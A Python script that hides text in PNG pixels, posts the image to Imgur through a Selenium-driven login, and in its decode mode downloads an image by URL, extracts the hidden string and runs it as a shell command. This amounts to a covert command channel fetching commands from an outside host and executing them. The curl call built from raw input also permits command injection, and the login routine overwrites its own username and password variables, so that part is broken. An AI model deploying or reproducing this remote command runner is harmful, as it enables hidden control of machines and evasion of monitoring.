import base64
import png
from decouple import config

from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from imgurpython import ImgurClient

import os
from subprocess import Popen, PIPE

def decodeMessage(message, delimiter):
    message = message.split(delimiter)[0]
    decodedString = int(message, 2).to_bytes(len(message) // 8, byteorder='big')
    decodedString = base64.decodebytes(decodedString).decode('utf-8')
    
    return decodedString

def showData(pixels, delimiter):
    decodedString = []
    for row in pixels:
        for i in row:
            decodedString.append(str(i%2))
    decodedString = ''.join(decodedString)
    message = decodeMessage(decodedString, delimiter)

    return message

def uploadImage(client, imageName):
    config = {
        'album': imageName,
        'name': imageName,
        'title': "Steganography " + imageName
    }

    image = client.upload_from_path(imageName, config=config, anon=False)

    print(f"File uploaded to: {image['link']}")

    return image

def authenticate(id, secret, username, password):
    client = ImgurClient(id, secret)

    authorization_url = client.get_auth_url('pin')
    
    driver = webdriver.Chrome(config("webdriver"))
    driver.get(authorization_url)

    username = driver.find_element_by_xpath('//*[@id="username"]')
    password = driver.find_element_by_xpath('//*[@id="password"]')
    username.clear()
    username.send_keys(username)
    password.send_keys(password)

    driver.find_element_by_name("allow").click()

    timeout = 20

    try:
        element_present = EC.presence_of_all_elements_located((By.ID, 'pin'))
        WebDriverWait(driver, timeout).until(element_present)
        pin_element = driver.find_element_by_id('pin')
        pin = pin_element.get_attribute("value")
    except TimeoutException:
        print("Timed out waiting for page to load")
    driver.close()

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])
    print('Authentication successful!')

    return client

def postToImgur(id, secret, username, password, imageName):
    client = authenticate(id, secret, username, password)
    uploadedImage = uploadImage(client, imageName)

def newImage(pixels, imageName):
    png.from_array(pixels, 'RGB').save(imageName)

def hideData(pixels, encodedString):
    enc_pixels = []
    string_i = 0
    for row in pixels:
        enc_row = []
        for i, char in enumerate(row):
            if string_i >= len(encodedString):
                pixel = row[i]
            else:
                if row[i] % 2 != int(encodedString[string_i]):
                    if row[i] == 0:
                        pixel = 1
                    else:
                        pixel = row[i] - 1
                else:
                    pixel = row[i]
            enc_row.append(pixel)
            string_i+=1

        enc_pixels.append(enc_row)

    return enc_pixels

def getPixel(imageName):
    img = png.Reader(imageName).read()
    pixels = img[2]
    
    return pixels

def encodeMessage(message, delimiter):
    message = message.encode("utf-8")
    encodedBytes = base64.b64encode(message)
    encodedString = "".join(["{:08b}".format(x) for x in encodedBytes])
    encodedString += delimiter

    return encodedString

def main():
    delimiter = "11110000101001011100001100011101"
    print("What do you want to do?\n1. Encode\n2. Decode")

    inp = ""
    while inp == "":
        try:
            inp = input(">> ")
        except Exception as e:
            print (f"Error raised: {e}")

    if inp == "1":
        plaintextMessage = input("Input string/command you want to hide: ")

        encodedString = encodeMessage(plaintextMessage, delimiter)

        imageName = input("Input your image name to hide the message [must be png and case sensitive]: ")
        if ".png" not in imageName:
            imageName += ".png"
        
        pixels = getPixel(imageName)
        encodedImage = hideData(pixels, encodedString)
        newImage(encodedImage, "new-" + imageName)

        id = config("id")
        secret = config("secret")
        username = config("username")
        password = config("password")

        postToImgur(id, secret, username, password, "new-" + imageName)
    elif inp == "2":
        imageName = input("Input your image name to hide the message [must be png and case sensitive]: ")
        if ".png" not in imageName:
            imageName += ".png"

        url = input("Url of the images: ")
        os.system(f"curl -o {imageName} {url}")

        pixels = getPixel(imageName)
        decodedString = showData(pixels, delimiter)

        process = Popen(decodedString, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        output, error = process.communicate()
    
if __name__ == "__main__":
    main()